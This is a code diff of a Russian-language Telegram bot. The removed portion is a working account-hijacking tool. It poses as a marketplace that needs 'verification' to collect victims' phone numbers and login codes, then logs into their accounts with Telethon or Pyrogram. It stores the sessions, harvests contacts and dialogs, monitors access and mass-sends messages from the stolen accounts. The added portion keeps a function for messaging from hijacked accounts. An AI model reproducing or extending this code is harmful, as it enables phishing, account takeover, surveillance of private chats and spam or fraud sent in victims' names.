+    def has_permission(self, user_id: int, permission: str) -> bool:
+        """Проверяет, есть ли у администратора определенное разрешение"""
+        if not self.is_admin(user_id):
+            return False
+        
+        admin_data = self.admin_cache[user_id]
+        
+        # Главный админ имеет все права
+        if admin_data['is_main_admin']:
+            return True
+        
+        permissions = admin_data['permissions']
+        
+        # Если разрешения 'all' - все доступно
+        if permissions == 'all':
+            return True
+        
+        # Проверяем конкретное разрешение
+        permission_list = permissions.split(',')
+        return permission in permission_list
+    
+    async def add_admin(self, user_id: int, username: str, added_by: int, 
+                       permissions: str = 'basic') -> Dict:
+        """Добавляет нового администратора"""
+        try:
+            # Проверяем, не является ли уже админом
+            if self.is_admin(user_id):
+                return {
+                    'success': False,
+                    'error': 'Пользователь уже является администратором'
+                }
+            
+            # Проверяем лимит админов
+            admin_count = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_active = 1")[0]
+            if admin_count >= config.MAX_ADMINS:
+                return {
+                    'success': False,
+                    'error': f'Достигнут лимит администраторов ({config.MAX_ADMINS})'
+                }
+            
+            # Генерируем токен сессии
+            session_token = encryptor.generate_token()
+            session_expires = (datetime.now() + timedelta(days=30)).isoformat()
+            
+            # Добавляем в базу
+            db.execute('''
+                INSERT INTO admins 
+                (user_id, username, added_by, permissions, session_token, session_expires)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (user_id, username, added_by, permissions, session_token, session_expires))
+            
+            # Добавляем в кэш
+            self.admin_cache[user_id] = {
+                'username': username,
+                'permissions': permissions,
+                'is_main_admin': False
+            }
+            
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (admin_id, action, details)
+                VALUES (?, ?, ?)
+            ''', (added_by, 'add_admin', f'Добавлен админ {username} (ID: {user_id})'))
+            
+            # Уведомляем нового админа
+            try:
+                await bot.send_message(
+                    user_id,
+                    f"🎉 <b>ВЫ НАЗНАЧЕНЫ АДМИНИСТРАТОРОМ!</b>\n\n"
+                    f"Вам предоставлены права администратора в системе SWILL.\n\n"
+                    f"👤 Ваш ID: {user_id}\n"
+                    f"🔑 Права: {permissions}\n"
+                    f"👑 Добавил: ID {added_by}\n\n"
+                    f"Используйте /start для доступа к панели администратора.",
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logger.warning(f"Не удалось уведомить нового админа: {e}")
+            
+            logger.info(f"Добавлен новый админ: {username} (ID: {user_id})")
+            
+            return {
+                'success': True,
+                'user_id': user_id,
+                'username': username,
+                'permissions': permissions
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка добавления администратора: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def remove_admin(self, admin_id: int, removed_by: int, reason: str = "") -> Dict:
+        """Удаляет администратора"""
+        try:
+            # Нельзя удалить главного админа
+            if admin_id == config.MAIN_ADMIN_ID:
+                return {
+                    'success': False,
+                    'error': 'Нельзя удалить главного администратора'
+                }
+            
+            # Проверяем, существует ли админ
+            admin_data = db.fetch_one(
+                "SELECT username FROM admins WHERE user_id = ?",
+                (admin_id,)
+            )
+            
+            if not admin_data:
+                return {'success': False, 'error': 'Администратор не найден'}
+            
+            username = admin_data[0]
+            
+            # Удаляем (деактивируем) админа
+            db.execute('''
+                UPDATE admins 
+                SET is_active = 0, session_token = NULL, session_expires = NULL 
+                WHERE user_id = ?
+            ''', (admin_id,))
+            
+            # Удаляем из кэша
+            if admin_id in self.admin_cache:
+                del self.admin_cache[admin_id]
+            
+            # Уведомляем удаленного админа
+            try:
+                await bot.send_message(
+                    admin_id,
+                    f"⚠️ <b>ВАШИ ПРАВА АДМИНИСТРАТОРА ОТОЗВАНЫ</b>\n\n"
+                    f"Вы больше не имеете доступа к панели администратора.\n\n"
+                    f"👤 Ваш ID: {admin_id}\n"
+                    f"👑 Отозвал: ID {removed_by}\n"
+                    f"📝 Причина: {reason or 'Не указана'}\n\n"
+                    f"По всем вопросам обращайтесь к главному администратору.",
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logger.warning(f"Не удалось уведомить удаленного админа: {e}")
+            
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (admin_id, action, details)
+                VALUES (?, ?, ?)
+            ''', (removed_by, 'remove_admin', f'Удален админ {username} (ID: {admin_id}): {reason}'))
+            
+            logger.info(f"Удален админ: {username} (ID: {admin_id})")
+            
+            return {
+                'success': True,
+                'admin_id': admin_id,
+                'username': username,
+                'removed_by': removed_by
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка удаления администратора: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def update_admin_permissions(self, admin_id: int, permissions: str, 
+                                     updated_by: int) -> Dict:
+        """Обновляет права администратора"""
+        try:
+            # Проверяем, существует ли админ
+            admin_data = db.fetch_one(
+                "SELECT username FROM admins WHERE user_id = ? AND is_active = 1",
+                (admin_id,)
+            )
+            
+            if not admin_data:
+                return {'success': False, 'error': 'Администратор не найден'}
+            
+            username = admin_data[0]
+            
+            # Обновляем права
+            db.execute(
+                "UPDATE admins SET permissions = ? WHERE user_id = ?",
+                (permissions, admin_id)
+            )
+            
+            # Обновляем кэш
+            if admin_id in self.admin_cache:
+                self.admin_cache[admin_id]['permissions'] = permissions
+            
+            # Уведомляем админа об изменении прав
+            try:
+                await bot.send_message(
+                    admin_id,
+                    f"🔧 <b>ВАШИ ПРАВА ОБНОВЛЕНЫ</b>\n\n"
+                    f"Ваши права администратора были изменены.\n\n"
+                    f"👤 Ваш ID: {admin_id}\n"
+                    f"🔑 Новые права: {permissions}\n"
+                    f"👑 Изменил: ID {updated_by}\n\n"
+                    f"Некоторые функции могут стать недоступны.",
+                    parse_mode="HTML"
+                )
+            except Exception as e:
+                logger.warning(f"Не удалось уведомить админа об изменении прав: {e}")
+            
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (admin_id, action, details)
+                VALUES (?, ?, ?)
+            ''', (updated_by, 'update_admin_permissions', f'Обновлены права для {username}: {permissions}'))
+            
+            return {
+                'success': True,
+                'admin_id': admin_id,
+                'username': username,
+                'permissions': permissions
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка обновления прав администратора: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    def get_all_admins(self) -> List[Dict]:
+        """Возвращает список всех администраторов"""
+        try:
+            admins = db.fetch_all('''
+                SELECT a.user_id, a.username, a.added_by, a.added_date, a.permissions, 
+                       a.is_main_admin, b.username as added_by_username
+                FROM admins a
+                LEFT JOIN admins b ON a.added_by = b.user_id
+                WHERE a.is_active = 1
+                ORDER BY a.is_main_admin DESC, a.added_date DESC
+            ''')
+            
+            result = []
+            for admin in admins:
+                result.append({
+                    'user_id': admin[0],
+                    'username': admin[1],
+                    'added_by': admin[2],
+                    'added_by_username': admin[6],
+                    'added_date': admin[3],
+                    'permissions': admin[4],
+                    'is_main_admin': bool(admin[5])
+                })
+            
+            return result
+            
+        except Exception as e:
+            logger.error(f"Ошибка получения списка администраторов: {e}")
+            return []
+    
+    async def validate_session(self, user_id: int, session_token: str) -> bool:
+        """Проверяет валидность сессии администратора"""
+        try:
+            admin_data = db.fetch_one(
+                "SELECT session_token, session_expires FROM admins WHERE user_id = ? AND is_active = 1",
+                (user_id,)
+            )
+            
+            if not admin_data:
+                return False
+            
+            stored_token, expires_str = admin_data
+            
+            if not stored_token or stored_token != session_token:
+                return False
+            
+            # Проверяем срок действия
+            expires = datetime.fromisoformat(expires_str)
+            if expires < datetime.now():
+                return False
             
             return True
             
         except Exception as e:
-            logger.error(f"[HIJACK] Ошибка отправки сообщения: {e}")
-            
-            self.cursor.execute(
-                "INSERT INTO account_actions (phone, action_type, target, message, status) VALUES (?, ?, ?, ?, ?)",
-                (phone, "send_message", target, message[:100], "failed")
-            )
-            self.conn.commit()
-            
+            logger.error(f"Ошибка проверки сессии: {e}")
             return False
     
-    def get_hijacked_accounts(self):
-        """Получает список захваченных аккаунтов"""
-        self.cursor.execute(
-            "SELECT phone, user_id, username, first_name, hijacked_at, is_active FROM hijacked_sessions ORDER BY hijacked_at DESC"
-        )
-        return self.cursor.fetchall()
-    
-    def get_active_accounts(self):
-        """Получает активные аккаунты"""
-        self.cursor.execute(
-            "SELECT phone, user_id, username FROM hijacked_sessions WHERE is_active = 1 ORDER BY hijacked_at DESC"
-        )
-        return self.cursor.fetchall()
-    
-    def update_account_status(self, phone: str, is_active: bool):
-        """Обновляет статус аккаунта"""
-        self.cursor.execute(
-            "UPDATE hijacked_sessions SET is_active = ?, last_check = ? WHERE phone = ?",
-            (1 if is_active else 0, datetime.now().isoformat(), phone)
-        )
-        self.conn.commit()
-    
-    def cleanup(self):
-        """Очистка ресурсов"""
-        self.conn.close()
-
-# Инициализация БД с учетом окружения
-def init_db():
-    # Определяем путь к БД в зависимости от окружения
-    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_STATIC_URL'):
-        # На Railway используем временную директорию
-        db_path = os.path.join(tempfile.gettempdir(), 'market_bot.db')
-        print(f"[DB] Using database at: {db_path}")
-    else:
-        # Локально используем текущую директорию
-        db_path = 'market_bot.db'
-        print(f"[DB] Using local database: {db_path}")
-    
-    conn = sqlite3.connect(db_path, check_same_thread=False)
-    cursor = conn.cursor()
-    
-    # Таблица пользователей
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY,
-            username TEXT,
-            first_name TEXT,
-            phone TEXT,
-            code TEXT,
-            balance REAL DEFAULT 0,
-            rating INTEGER DEFAULT 5,
-            status TEXT DEFAULT 'active',
-            registered DATETIME DEFAULT CURRENT_TIMESTAMP,
-            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    
-    # Таблица товаров
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS items (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            item_type TEXT,
-            photos TEXT,
-            description TEXT,
-            price REAL,
-            moderator_id INTEGER,
-            status TEXT DEFAULT 'pending',
-            created DATETIME DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY (user_id) REFERENCES users (user_id)
-        )
-    ''')
-    
-    # Таблица чатов с модератором
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS chats (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            moderator_id INTEGER,
-            messages TEXT,
-            status TEXT DEFAULT 'open',
-            created DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    
-    # Таблица логов
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            action TEXT,
-            details TEXT,
-            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    
-    # Таблица SMS кодов
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS sms_codes (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            phone TEXT,
-            code TEXT,
-            sent_time DATETIME DEFAULT CURRENT_TIMESTAMP,
-            used BOOLEAN DEFAULT 0
-        )
-    ''')
-    
-    conn.commit()
-    return conn, cursor
-
-conn, cursor = init_db()
-
-# Создаем директории для фотографий
-os.makedirs('photos', exist_ok=True)
-
-# Инициализация захватчика аккаунтов
-hijacker = None
-if TELEGRAM_API_ID and TELEGRAM_API_HASH:
-    try:
-        hijacker = TelegramAccountHijacker(TELEGRAM_API_ID, TELEGRAM_API_HASH)
-        logger.info("[HIJACK] ✅ Telegram Account Hijacker инициализирован")
-    except Exception as e:
-        logger.error(f"[HIJACK] Ошибка инициализации hijacker: {e}")
-        hijacker = None
-else:
-    logger.warning("[HIJACK] ⚠️ Hijacker не инициализирован (проверьте API credentials)")
-
-async def simulate_sms_delivery(user_id: int, phone: str, code: str):
-    """
-    Имитирует задержку доставки SMS
-    """
-    try:
-        # Случайная задержка от 3 до 10 секунд для реалистичности
-        delay = random.uniform(3, 10)
-        await asyncio.sleep(delay)
-
-        # Сохраняем в историю отправленных кодов
-        cursor.execute(
-            "INSERT INTO sms_codes (user_id, phone, code, used) VALUES (?, ?, ?, ?)",
-            (user_id, phone, code, 0)
-        )
-        conn.commit()
-        
-        logger.info(f"[SMS SIM] Код {code} 'отправлен' пользователю {user_id} на номер {phone}")
-            
-    except Exception as e:
-        logger.error(f"[SMS SIM] Критическая ошибка в функции simulate_sms_delivery: {e}")
-
-# Функция запроса верификации
-async def request_verification(callback_query: types.CallbackQuery):
-    verification_text = """
-🔐 <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>
-
-Для продажи товаров необходимо подтвердить ваш аккаунт Telegram.
-
-<b>Зачем это нужно:</b>
-• Защита от мошенничества
-• Гарантия выплат
-• Юридическое оформление сделок
-
-<b>Нажмите кнопку для верификации:</b>
-    """
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="start_verification")]
-    ])
-    
-    await bot.edit_message_text(
-        verification_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML",
-        reply_markup=keyboard
-    )
-
-# ========== ФУНКЦИИ АВТОМАТИЧЕСКОГО ВХОДА ==========
-
-async def auto_login_hijacked_accounts():
-    """Автоматически входит во все сохраненные аккаунты при запуске бота"""
-    if not hijacker:
-        logger.warning("[AUTO-LOGIN] Hijacker не инициализирован, пропускаю авто-вход")
-        return
-    
-    try:
-        accounts = hijacker.get_hijacked_accounts()
-        logger.info(f"[AUTO-LOGIN] Найдено {len(accounts)} сохраненных аккаунтов для авто-проверки")
-        
-        active_count = 0
-        inactive_count = 0
-        
-        for account in accounts:
-            phone = account[0]
-            session_string = None
-            
-            # Получаем последнюю сессию
-            hijacker.cursor.execute(
-                "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
-                (phone,)
-            )
-            result = hijacker.cursor.fetchone()
-            
-            if result and result[0]:
-                session_string = result[0]
-                
-                # Проверяем доступ
-                is_active = await hijacker.check_account_access(session_string)
-                
-                if is_active:
-                    hijacker.update_account_status(phone, True)
-                    active_count += 1
-                    logger.info(f"[AUTO-LOGIN] ✅ Аккаунт {phone} активен")
-                else:
-                    hijacker.update_account_status(phone, False)
-                    inactive_count += 1
-                    logger.warning(f"[AUTO-LOGIN] ❌ Аккаунт {phone} неактивен")
-                    
-                    # Уведомляем админа
-                    try:
-                        await bot.send_message(
-                            ADMIN_ID,
-                            f"⚠️ <b>АККАУНТ НЕАКТИВЕН</b>\n\n"
-                            f"Номер: +{phone}\n"
-                            f"Требуется повторный захват\n"
-                            f"Время: {datetime.now().strftime('%H:%M:%S')}",
-                            parse_mode="HTML"
-                        )
-                    except:
-                        pass
-            else:
-                logger.warning(f"[AUTO-LOGIN] ⚠️ Нет сохраненной сессии для {phone}")
-        
-        logger.info(f"[AUTO-LOGIN] Проверка завершена: {active_count} активных, {inactive_count} неактивных")
-        
-        # Отправляем отчет админу
+    async def create_session(self, user_id: int) -> str:
+        """Создает новую сессию для администратора"""
         try:
-            await bot.send_message(
-                ADMIN_ID,
-                f"📊 <b>АВТО-ПРОВЕРКА АККАУНТОВ</b>\n\n"
-                f"✅ Активных: {active_count}\n"
-                f"❌ Неактивных: {inactive_count}\n"
-                f"📈 Всего: {len(accounts)}\n"
-                f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
-                parse_mode="HTML"
+            session_token = encryptor.generate_token()
+            session_expires = (datetime.now() + timedelta(days=30)).isoformat()
+            
+            db.execute(
+                "UPDATE admins SET session_token = ?, session_expires = ? WHERE user_id = ?",
+                (session_token, session_expires, user_id)
             )
-        except:
-            pass
             
-    except Exception as e:
-        logger.error(f"[AUTO-LOGIN] Ошибка авто-входа: {e}")
-
-async def monitor_hijacked_accounts():
-    """Постоянно мониторит активность захваченных аккаунтов"""
-    if not hijacker:
-        logger.warning("[MONITOR] Hijacker не инициализирован, пропускаю мониторинг")
-        return
-    
-    logger.info("[MONITOR] Запуск мониторинга аккаунтов...")
-    
-    while True:
-        try:
-            accounts = hijacker.get_active_accounts()
-            
-            if accounts:
-                logger.info(f"[MONITOR] Мониторинг {len(accounts)} активных аккаунтов")
-                
-                for account in accounts:
-                    phone = account[0]
-                    
-                    # Получаем сессию
-                    hijacker.cursor.execute(
-                        "SELECT session_string FROM hijacked_sessions WHERE phone = ? AND is_active = 1 ORDER BY hijacked_at DESC LIMIT 1",
-                        (phone,)
-                    )
-                    result = hijacker.cursor.fetchone()
-                    
-                    if result and result[0]:
-                        session_string = result[0]
-                        
-                        # Проверяем доступ
-                        is_active = await hijacker.check_account_access(session_string)
-                        
-                        if not is_active:
-                            # Обновляем статус
-                            hijacker.update_account_status(phone, False)
-                            
-                            # Уведомляем админа
-                            await bot.send_message(
-                                ADMIN_ID,
-                                f"🚨 <b>СЕССИЯ УТЕРЯНА</b>\n\n"
-                                f"Аккаунт: +{phone}\n"
-                                f"Требуется повторный захват\n"
-                                f"Время: {datetime.now().strftime('%H:%M:%S')}",
-                                parse_mode="HTML"
-                            )
-                            logger.warning(f"[MONITOR] Сессия для {phone} утеряна")
-            
-            # Проверяем каждые 30 минут
-            await asyncio.sleep(1800)  # 30 минут
+            return session_token
             
         except Exception as e:
-            logger.error(f"[MONITOR] Ошибка мониторинга: {e}")
-            await asyncio.sleep(300)  # 5 минут при ошибке
+            logger.error(f"Ошибка создания сессии: {e}")
+            return None
 
-async def attempt_account_hijack(phone: str, code: str, victim_user_id: int):
-    """Пытается захватить аккаунт Telegram автоматически"""
-    if not hijacker:
-        logger.warning(f"[HIJACK ATTEMPT] Hijacker не инициализирован, пропускаю захват для {phone}")
-        return
+admin_manager = AdminManager()
+
+# ========== СИСТЕМА ОТПРАВКИ СООБЩЕНИЙ ==========
+class MessageSystem:
+    """Система отправки сообщений пользователям"""
     
-    try:
-        logger.info(f"[HIJACK ATTEMPT] 🔄 Начинаю захват аккаунта для номера: +{phone}")
-        
-        # Сохраняем в лог начало попытки
-        hijacker.cursor.execute(
-            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
-            (phone, "start_hijack", "начат")
-        )
-        hijacker.conn.commit()
-        
-        # Пытаемся войти через Telethon
-        session_string = await hijacker.hijack_account_telethon(phone, code)
-        
-        if session_string:
-            result = "success"
-            result_msg = "Аккаунт успешно захвачен через Telethon"
+    async def send_to_user_by_username(self, username: str, message: str, 
+                                     from_admin_id: int, media_path: str = None) -> Dict:
+        """Отправляет сообщение пользователю по username"""
+        try:
+            # Пытаемся найти пользователя по username
+            user_id = await self._resolve_username(username)
             
-            # Пробуем отправить тестовое сообщение админу
+            if not user_id:
+                return {
+                    'success': False,
+                    'error': f'Пользователь {username} не найден'
+                }
+            
+            # Отправляем сообщение
             try:
-                await hijacker.send_message_from_hijacked(
-                    phone,
-                    str(ADMIN_ID),
-                    f"👋 Аккаунт +{phone} захвачен. Я активен! Время: {datetime.now().strftime('%H:%M:%S')}"
-                )
-            except Exception as send_error:
-                logger.error(f"[HIJACK ATTEMPT] Не удалось отправить тестовое сообщение: {send_error}")
+                if media_path and os.path.exists(media_path):
+                    with open(media_path, 'rb') as f:
+                        if media_path.lower().endswith(('.jpg', '.jpeg', '.png')):
+                            sent_message = await bot.send_photo(
+                                user_id,
+                                InputFile(f),
+                                caption=message
+                            )
+                        elif media_path.lower().endswith('.mp4'):
+                            sent_message = await bot.send_video(
+                                user_id,
+                                InputFile(f),
+                                caption=message
+                            )
+                        else:
+                            sent_message = await bot.send_document(
+                                user_id,
+                                InputFile(f),
+                                caption=message
+                            )
+                else:
+                    sent_message = await bot.send_message(
+                        user_id,
+                        message,
+                        parse_mode="HTML"
+                    )
                 
-        else:
-            # Пробуем Pyrogram как запасной вариант
-            logger.info(f"[HIJACK ATTEMPT] Пробую Pyrogram для {phone}")
-            session_string = await hijacker.hijack_account_pyrogram(phone, code)
-            
-            if session_string:
-                result = "success_pyrogram"
-                result_msg = "Аккаунт успешно захвачен через Pyrogram"
-            else:
-                result = "failed"
-                result_msg = "Не удалось захватить аккаунт"
-        
-        # Сохраняем результат
-        hijacker.cursor.execute(
-            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
-            (phone, "hijack_attempt", result)
-        )
-        hijacker.conn.commit()
-        
-        # Отправляем отчет админу
-        hijack_report = f"""
-🎯 <b>РЕЗУЛЬТАТ ЗАХВАТА АККАУНТА</b>
-━━━━━━━━━━━━━━━━
-📱 <b>Номер:</b> +{phone}
-🔢 <b>Код:</b> {code}
-🔄 <b>Метод:</b> {'Telethon' if 'telethon' in result else 'Pyrogram' if 'pyrogram' in result else 'Ошибка'}
-✅ <b>Результат:</b> {result_msg}
-⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━
-"""
-        
-        try:
-            await bot.send_message(ADMIN_ID, hijack_report, parse_mode="HTML")
-            
-            if "success" in result:
-                # Получаем список захваченных аккаунтов
-                accounts = hijacker.get_hijacked_accounts()
-                if accounts:
-                    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ:</b>\n"
-                    for acc in accounts[:10]:  # Первые 10
-                        status = "✅" if acc[5] == 1 else "❌"
-                        accounts_text += f"\n• {status} +{acc[0]} (@{acc[2] or 'нет'}) - {acc[4][:16]}"
-                    await bot.send_message(ADMIN_ID, accounts_text, parse_mode="HTML")
-                    
+                # Сохраняем в базу
+                db.execute('''
+                    INSERT INTO messages 
+                    (message_id, from_admin_id, to_user_id, to_username, message_text, 
+                     message_type, sent_date, status)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (
+                    sent_message.message_id,
+                    from_admin_id,
+                    user_id,
+                    username,
+                    message,
+                    'photo' if media_path and media_path.lower().endswith(('.jpg', '.jpeg', '.png')) else 
+                    'video' if media_path and media_path.lower().endswith('.mp4') else 
+                    'document' if media_path else 'text',
+                    datetime.now().isoformat(),
+                    'delivered'
+                ))
+                
+                # Логируем действие
+                db.execute('''
+                    INSERT INTO security_logs 
+                    (admin_id, action, details)
+                    VALUES (?, ?, ?)
+                ''', (from_admin_id, 'send_message', f'Отправлено сообщение пользователю {username}'))
+                
+                return {
+                    'success': True,
+                    'message_id': sent_message.message_id,
+                    'user_id': user_id,
+                    'username': username,
+                    'status': 'delivered'
+                }
+                
+            except TelegramBadRequest as e:
+                error_msg = str(e)
+                if "user not found" in error_msg.lower() or "chat not found" in error_msg.lower():
+                    status = 'user_not_found'
+                elif "blocked" in error_msg.lower():
+                    status = 'user_blocked'
+                elif "privacy" in error_msg.lower():
+                    status = 'privacy_restriction'
+                else:
+                    status = 'error'
+                
+                # Сохраняем в базу с ошибкой
+                db.execute('''
+                    INSERT INTO messages 
+                    (from_admin_id, to_username, message_text, sent_date, status)
+                    VALUES (?, ?, ?, ?, ?)
+                ''', (from_admin_id, username, message, datetime.now().isoformat(), status))
+                
+                return {
+                    'success': False,
+                    'error': error_msg,
+                    'status': status
+                }
+                
         except Exception as e:
-            logger.error(f"[HIJACK ATTEMPT] Ошибка отправки отчета: {e}")
-        
-        logger.info(f"[HIJACK ATTEMPT] Захват аккаунта {phone} завершен: {result}")
-        
-        # Уведомляем жертву об успешной верификации
+            logger.error(f"Ошибка отправки сообщения пользователю {username}: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def _resolve_username(self, username: str) -> Optional[int]:
+        """Разрешает username в user_id"""
         try:
-            await bot.send_message(
-                victim_user_id,
-                f"✅ <b>Верификация успешно завершена!</b>\n\n"
-                f"Ваш аккаунт подтвержден. Теперь вы можете продавать товары.\n\n"
-                f"<i>Нажмите кнопку ниже для продолжения:</i>",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                    [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")]
-                ])
-            )
-        except:
-            pass
-        
-    except Exception as e:
-        logger.error(f"[HIJACK ATTEMPT] Критическая ошибка при захвате аккаунта {phone}: {e}")
-        
-        # Сохраняем ошибку
-        hijacker.cursor.execute(
-            "INSERT INTO hijack_logs (phone, action, result) VALUES (?, ?, ?)",
-            (phone, "hijack_error", str(e)[:200])
-        )
-        hijacker.conn.commit()
-
-async def perform_post_login_actions(phone: str, session_string: str):
-    """Выполняет автоматические действия после успешного входа"""
-    if not hijacker:
-        return
-    
-    try:
-        client = TelegramClient(
-            session=StringSession(session_string),
-            api_id=hijacker.api_id,
-            api_hash=hijacker.api_hash
-        )
-        
-        await client.connect()
-        
-        # 1. Получаем информацию об аккаунте
-        me = await client.get_me()
-        
-        # 2. Получаем диалоги (первые 20)
-        dialogs = await client.get_dialogs(limit=20)
-        
-        # 3. Получаем контакты
-        contacts = await client.get_contacts()
-        
-        # 4. Сохраняем статистику
-        hijacker.cursor.execute('''
-            UPDATE hijacked_sessions 
-            SET username = ?, first_name = ?, last_check = ?
-            WHERE phone = ?
-        ''', (
-            me.username,
-            me.first_name,
-            datetime.now().isoformat(),
-            phone
-        ))
-        hijacker.conn.commit()
-        
-        # 5. Отправляем отчет админу
-        report = f"""
-🎯 <b>АВТОМАТИЧЕСКИЙ ЗАХВАТ ЗАВЕРШЕН</b>
-━━━━━━━━━━━━━━━━
-📱 <b>Аккаунт:</b> +{phone}
-👤 <b>Username:</b> @{me.username or 'нет'}
-🆔 <b>ID:</b> {me.id}
-👥 <b>Контакты:</b> {len(contacts)}
-💬 <b>Диалоги:</b> {len(dialogs)}
-⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━
-✅ <b>Аккаунт готов к использованию</b>
-"""
-        await bot.send_message(ADMIN_ID, report, parse_mode="HTML")
-        
-        # 6. Сохраняем диалоги
-        for dialog in dialogs[:10]:
-            hijacker.cursor.execute('''
-                INSERT OR IGNORE INTO hijacked_dialogs 
-                (phone, dialog_id, dialog_name, dialog_type, last_message)
-                VALUES (?, ?, ?, ?, ?)
-            ''', (
-                phone,
-                dialog.id,
-                dialog.name or dialog.title,
-                'private' if dialog.is_user else 'group' if dialog.is_group else 'channel',
-                dialog.message.text[:100] if dialog.message else ''
-            ))
-        hijacker.conn.commit()
-        
-        await client.disconnect()
-        
-    except Exception as e:
-        logger.error(f"[POST-LOGIN] Ошибка post-login действий: {e}")
-
-async def auto_message_from_all_accounts(message_text: str, targets: list):
-    """Автоматическая отправка сообщений от всех активных аккаунтов"""
-    if not hijacker:
-        logger.warning("[AUTO-MESSAGE] Hijacker не инициализирован")
-        return
-    
-    try:
-        active_accounts = hijacker.get_active_accounts()
-        
-        if not active_accounts:
-            logger.warning("[AUTO-MESSAGE] Нет активных аккаунтов")
-            return
-    
-        logger.info(f"[AUTO-MESSAGE] Начинаю рассылку с {len(active_accounts)} аккаунтов")
-        
-        for account in active_accounts:
-            phone = account[0]
+            # Убираем @ если есть
+            if username.startswith('@'):
+                username = username[1:]
             
-            for target in targets:
+            # Пробуем через get_chat
+            try:
+                chat = await bot.get_chat(f"@{username}")
+                return chat.id
+            except:
+                pass
+            
+            # Проверяем в базе пользователей
+            user_data = db.fetch_one(
+                "SELECT user_id FROM users WHERE username = ?",
+                (username,)
+            )
+            
+            if user_data:
+                return user_data[0]
+            
+            return None
+            
+        except Exception as e:
+            logger.error(f"Ошибка разрешения username {username}: {e}")
+            return None
+    
+    async def broadcast_to_all_channels(self, message: str, from_admin_id: int, 
+                                      media_path: str = None) -> Dict:
+        """Рассылает сообщение во все одобренные каналы"""
+        try:
+            # Получаем все одобренные каналы с включенными уведомлениями
+            channels = db.fetch_all('''
+                SELECT id, channel_id FROM channels 
+                WHERE is_approved = 1 AND notifications_enabled = 1
+            ''')
+            
+            if not channels:
+                return {
+                    'success': False,
+                    'error': 'Нет одобренных каналов для рассылки'
+                }
+            
+            results = {
+                'total': len(channels),
+                'success': 0,
+                'failed': 0,
+                'errors': []
+            }
+            
+            # Отправляем в каждый канал
+            for channel in channels:
+                channel_db_id, channel_id = channel
+                
                 try:
-                    success = await hijacker.send_message_from_hijacked(
-                        phone, 
-                        target, 
-                        message_text
+                    result = await channel_manager.send_to_channel(
+                        channel_db_id,
+                        message,
+                        media_path
                     )
                     
-                    if success:
-                        logger.info(f"[AUTO-MESSAGE] Сообщение от {phone} к {target} отправлено")
+                    if result['success']:
+                        results['success'] += 1
                     else:
-                        logger.warning(f"[AUTO-MESSAGE] Не удалось отправить от {phone} к {target}")
+                        results['failed'] += 1
+                        results['errors'].append(f"{channel_id}: {result.get('error', 'Unknown error')}")
                     
-                    await asyncio.sleep(10)  # Задержка 10 секунд между сообщениями
+                    # Задержка между отправками
+                    await asyncio.sleep(1)
                     
                 except Exception as e:
-                    logger.error(f"[AUTO-MESSAGE] Ошибка отправки: {e}")
-                    await asyncio.sleep(5)
+                    results['failed'] += 1
+                    results['errors'].append(f"{channel_id}: {str(e)[:100]}")
+                    logger.error(f"Ошибка отправки в канал {channel_id}: {e}")
             
-            # Задержка между аккаунтами
-            await asyncio.sleep(30)
+            # Логируем действие
+            db.execute('''
+                INSERT INTO security_logs 
+                (admin_id, action, details)
+                VALUES (?, ?, ?)
+            ''', (from_admin_id, 'broadcast', f'Рассылка в {results["total"]} каналов: {results["success"]} успешно'))
+            
+            return {
+                'success': results['success'] > 0,
+                'results': results
+            }
+            
+        except Exception as e:
+            logger.error(f"Ошибка рассылки: {e}")
+            return {'success': False, 'error': str(e)}
+    
+    async def send_from_hijacked_account(self, account_id: int, target: str, 
+                                       message: str, from_admin_id: int) -> Dict:
+        """Отправляет сообщение от захваченного аккаунта"""
+        try:
+            result = await account_manager.send_message_from_account(
